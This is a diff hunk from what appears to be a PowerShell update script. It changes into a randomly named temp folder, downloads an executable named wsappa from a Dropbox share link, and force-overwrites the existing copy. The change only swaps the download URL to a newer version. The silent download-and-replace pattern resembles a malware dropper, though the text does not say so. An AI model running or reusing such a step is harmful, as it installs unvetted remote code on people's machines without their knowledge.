@@ -5,7 +5,7 @@ start-sleep 10
 cd $env:temp/sVBXKuz
 
 #download new file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/ktmct46mftulye1s7ka7j/wsappa-1.5.exe?rlkey=sfae0om54ct58a3cmgh3z4ndg&dl=0" -OutFile wsappa_new.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/p5ifhyuv4p1ui2ecolmoz/wsappa-1.6.exe?rlkey=duuxz6c3b7168p2r6iu3ozjaw&dl=0" -OutFile wsappa_new.exe
 Copy-Item -Path .\wsappa_new.exe -Destination .\wsappa.exe -Force
 
 #delete old file
